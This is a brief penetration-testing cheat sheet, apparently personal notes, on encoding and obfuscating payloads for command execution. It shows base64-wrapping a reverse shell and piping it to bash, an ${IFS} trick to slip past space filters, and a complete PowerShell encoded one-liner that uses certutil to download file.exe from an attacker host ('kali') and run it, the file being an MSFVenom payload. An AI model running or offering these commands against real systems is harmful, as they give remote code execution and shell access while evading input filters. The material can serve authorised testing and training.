### Command

#### 1) 

    echo 'REVERSE_SHELL_PAYLOAD' | base64

#### 2) 

    echo 'BASE64_REVSHELL'|base64 -d|bash

Space delimiter

    echo${IFS}BASE64_SHELL|base64${IFS}-d|bash

#### 3) Powershell Encoded:

### Payload to be encoded:

    certutil.exe -f -urlcache http://kali/file.exe file.exe; .\file.exe

### Encoding :

    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('certutil.exe -f -urlcache http://kali/file.exe file.exe; .\file.exe'))

### Executing :

    powershell.exe -nop -e [above encoded code]

### File.exe has been generated using MSFVenom
